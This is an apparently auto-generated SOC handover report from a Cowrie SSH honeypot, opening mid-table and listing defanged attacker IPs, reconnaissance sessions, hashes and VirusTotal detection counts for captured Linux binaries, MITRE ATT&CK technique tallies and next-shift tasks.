| `2026-04-05 22:28:35` | `cowrie.session.connect` |
| `2026-04-05 22:28:35` | `cowrie.client.version` |
| `2026-04-05 22:28:35` | `cowrie.client.kex` |
| `2026-04-05 22:28:36` | `cowrie.login.success` |
| `2026-04-05 22:28:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.39.204[.]145` to AbuseIPDB if not already reported
- [ ] Block `185.39.204[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `74.91.224[.]229` | **13** | 2026-04-05 20:30 | 2026-04-05 20:58 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `104.208.108[.]166` | **3** | 2026-04-05 20:37 | 2026-04-05 20:41 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `102.88.137[.]80` | **2** | 2026-04-05 20:30 | 2026-04-05 20:31 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.65.192[.]71` | **2** | 2026-04-05 21:34 | 2026-04-05 21:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `118.114.13[.]151` | 1 | 2026-04-05 21:49 | 2026-04-05 21:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.193.33[.]3` | 1 | 2026-04-05 21:35 | 2026-04-05 21:35 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.109[.]159` | 1 | 2026-04-05 21:44 | 2026-04-05 21:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.87[.]166` | 1 | 2026-04-05 21:38 | 2026-04-05 21:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]232` | 1 | 2026-04-05 21:37 | 2026-04-05 21:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `164.92.82[.]0` | 1 | 2026-04-05 22:16 | 2026-04-05 22:17 | 8s | 0 | `T1592` | 🟢 LOW |
| `185.39.204[.]145` | 1 | 2026-04-05 22:28 | 2026-04-05 22:28 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.128.160[.]208` | 1 | 2026-04-05 21:35 | 2026-04-05 21:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `96.1.73[.]179` | 1 | 2026-04-05 21:19 | 2026-04-05 21:19 | 14s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 42/100 | 🟡 MEDIUM | **32/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `118.114.13[.]151` | CN | CHINANET Sichuan province network | **100** ⚠️ | 3 |
| `164.92.82[.]0` | US | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `112.118.57[.]75` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 10 |
| `102.88.137[.]80` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `118.193.33[.]3` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 40 |
| `74.91.224[.]229` | SG | Newfold Digital, Inc. | **100** ⚠️ | 2 |
| `27.128.160[.]208` | CN | CHINANET hebei province network | **100** ⚠️ | 50 |
| `120.48.109[.]159` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `185.39.204[.]145` | TR | GLOBAL CONNECTIVITY SOLUTIONS LLP | **100** ⚠️ | 16 |
| `14.103.127[.]232` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 87 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 32 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 24 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 18 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 18 |

---

## 🔕 False Positive Summary (32 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 2 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 31 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 93 cases |
| Tool 34  | Credential Extractor        | ✅ 56 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 16 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 32 filtered (34.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 12 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 32 priority case(s) shown individually · 13 recon entry/entries in table (4 group(s) consolidating 20 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-05T22:29:41Z_
